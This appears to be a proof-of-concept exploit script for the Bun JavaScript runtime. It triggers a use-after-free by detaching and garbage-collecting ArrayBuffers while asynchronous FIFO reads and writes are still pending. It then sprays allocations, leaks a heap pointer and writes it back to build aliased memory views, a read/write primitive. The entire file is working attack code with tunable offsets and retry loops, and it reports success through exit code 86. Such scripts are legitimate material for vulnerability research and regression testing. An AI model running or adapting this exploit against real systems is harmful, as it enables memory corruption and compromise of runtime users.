import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const uafSize = Number(process.env.UAF_SIZE || 128);
const viewSize = Number(process.env.VIEW_SIZE || 128);
const sprayCount = Number(process.env.SPRAY_COUNT || 8192);
const leakOffset = Number(process.env.LEAK_OFFSET || 16);
const writeOffset = Number(process.env.WRITE_OFFSET || 16);
const sourceFill = Number(process.env.SOURCE_FILL || 0x31);
const targetFill = Number(process.env.TARGET_FILL || 0x71);
const aliasWrite = Number(process.env.ALIAS_WRITE || 0x44);
const leakAttempts = Number(process.env.LEAK_ATTEMPTS || 16);
const writeAttempts = Number(process.env.WRITE_ATTEMPTS || 16);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);

const sourceViews = [];
const targetViews = [];
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-arraybuffer-backing-alias-${label}-${process.pid}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);

  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(fifo) {
  for (const fd of [fifo.writeFd, fifo.fillFd, fifo.readFd]) {
    try {
      fs.closeSync(fd);
    } catch {}
  }
  try {
    fs.unlinkSync(fifo.path);
  } catch {}
}

function isAgain(e) {
  return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK";
}

function fillFifo(fifo) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const written = fs.writeSync(fifo.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (written === 0) break;
      filled += written;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("failed to fill FIFO");
  return filled;
}

async function readExact(fifo, byteLength, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, byteLength)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;

  while (total < byteLength) {
    try {
      const n = fs.readSync(fifo.readFd, scratch, 0, Math.min(scratch.length, byteLength - total), null);
      if (n > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, n)));
        total += n;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }

    if (Date.now() >= deadline) throw new Error(`timed out reading ${label}: ${total}/${byteLength}`);
    await sleep(1);
  }

  return Buffer.concat(chunks, total);
}

function readU64LE(buf, offset) {
  let value = 0n;
  for (let i = 7; i >= 0; i--) value = (value << 8n) | BigInt(buf[offset + i]);
  return value;
}

function writeU64LE(value) {
  const out = Buffer.alloc(8);
  let v = value;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(v & 0xffn);
    v >>= 8n;
  }
  return out;
}

function hex(value) {
  return `0x${value.toString(16).padStart(16, "0")}`;
}

function isPointerLike(value) {
  return value >= 0x0000100000000000n && value <= 0x00007ffffffffffen && (value & 0x7n) === 0n;
}

function allocateViews(out, fillBase) {
  out.length = 0;
  for (let i = 0; i < sprayCount; i++) {
    const view = new Uint8Array(new ArrayBuffer(viewSize));
    view.fill((fillBase + (i & 15)) & 0xff);
    out.push(view);
  }
}

async function leakBackingCandidate() {
  const fifo = makeFifo("leak");
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(uafSize);
    const source = new Uint8Array(ab);
    source.fill(0x51);

    const done = new Promise(resolve => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => {
        resolve({ err, bytesWritten });
      });
    });

    detach(ab);
    gcNow();
    allocateViews(sourceViews, sourceFill);
    gcNow();

    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, uafSize, "metadata");
    const result = await done;
    return {
      pointer: readU64LE(leaked, leakOffset),
      bytesWritten: result.bytesWritten,
      prefix: [...leaked.subarray(0, 64)],
    };
  } finally {
    closeFifo(fifo);
  }
}

async function leakPointerLikeBackingCandidate() {
  const attempts = [];
  for (let i = 0; i < leakAttempts; i++) {
    const leak = await leakBackingCandidate();
    attempts.push({
      pointer: hex(leak.pointer),
      pointerLike: isPointerLike(leak.pointer),
      prefix: leak.prefix.slice(0, 16),
    });
    if (isPointerLike(leak.pointer)) return { leak, attempts };
  }
  return { leak: null, attempts };
}

async function writeBackingCandidate(pointer) {
  const path = join(tmpdir(), `bun-arraybuffer-backing-alias-write-${process.pid}`);
  const mkfifo = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mkfifo.status !== 0) throw new Error(`mkfifo failed with status ${mkfifo.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);

  try {
    const ab = new ArrayBuffer(uafSize);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise(resolve => {
      fs.read(fd, target, writeOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });

    detach(ab);
    gcNow();
    allocateViews(targetViews, targetFill);
    gcNow();

    fs.writeSync(fd, writeU64LE(pointer), 0, 8);
    const result = await done;

    const aliases = [];
    for (let i = 0; i < targetViews.length; i++) {
      const expected = (targetFill + (i & 15)) & 0xff;
      if (targetViews[i][0] !== expected) {
        aliases.push({ targetIndex: i, first: targetViews[i][0], expected });
        if (aliases.length >= 8) break;
      }
    }

    const writes = [];
    for (const alias of aliases) {
      targetViews[alias.targetIndex][0] = aliasWrite;
      for (let i = 0; i < sourceViews.length; i++) {
        if (sourceViews[i][0] === aliasWrite) {
          writes.push({ targetIndex: alias.targetIndex, sourceIndex: i, value: aliasWrite });
          break;
        }
      }
      if (writes.length >= 8) break;
    }

    return { bytesRead: result.bytesRead, err: result.err?.message, aliases, writes };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

async function writeBackingCandidateWithRetries(pointer) {
  const attempts = [];
  for (let i = 0; i < writeAttempts; i++) {
    const attempt = await writeBackingCandidate(pointer);
    attempts.push({ attempt: i + 1, ...attempt });
    if (attempt.writes.length > 0) return { best: attempt, attempts };
  }
  return { best: attempts.at(-1) ?? { aliases: [], writes: [] }, attempts };
}

const { leak, attempts } = await leakPointerLikeBackingCandidate();
if (!leak) {
  console.log(JSON.stringify({
    uafSize,
    viewSize,
    sprayCount,
    leakOffset,
    writeOffset,
    attempts,
    write: null,
  }));
  process.exit(1);
}

const write = await writeBackingCandidateWithRetries(leak.pointer);

console.log(JSON.stringify({
  uafSize,
  viewSize,
  sprayCount,
  leakOffset,
  writeOffset,
  attempts,
  leakedPointer: hex(leak.pointer),
  leakBytesWritten: leak.bytesWritten,
  leakPrefix: leak.prefix,
  write,
}));

process.exitCode = write.best.writes.length > 0 ? 86 : 1;
